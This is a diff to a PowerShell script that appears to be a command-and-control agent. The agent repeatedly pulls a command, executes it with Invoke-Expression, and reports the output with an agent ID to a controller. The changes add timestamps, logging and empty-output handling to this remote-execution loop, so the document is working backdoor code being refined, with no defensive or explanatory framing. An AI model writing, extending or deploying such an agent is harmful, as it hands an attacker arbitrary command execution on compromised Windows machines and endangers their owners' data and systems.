@@ -27,6 +27,7 @@ function Send-Result($output) {
     $body = @{
         agent_id = $agentID
         output   = $output
+        time     = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
     } | ConvertTo-Json
 
     try {
@@ -41,9 +42,15 @@ while ($true) {
     $cmd = Get-Command
     if ($cmd -ne "") {
         try {
+            Write-Host "[*] Executing command: $cmd"
             $result = Invoke-Expression $cmd | Out-String
+            if ([string]::IsNullOrWhiteSpace($result)) {
+                $result = "Command executed successfully but produced no output."
+            }
+            Write-Host "[*] Command output length: $($result.Length) characters"
         } catch {
             $result = "Error: $_"
+            Write-Host "[!] Command execution failed: $_"
         }
         Send-Result $result
     }
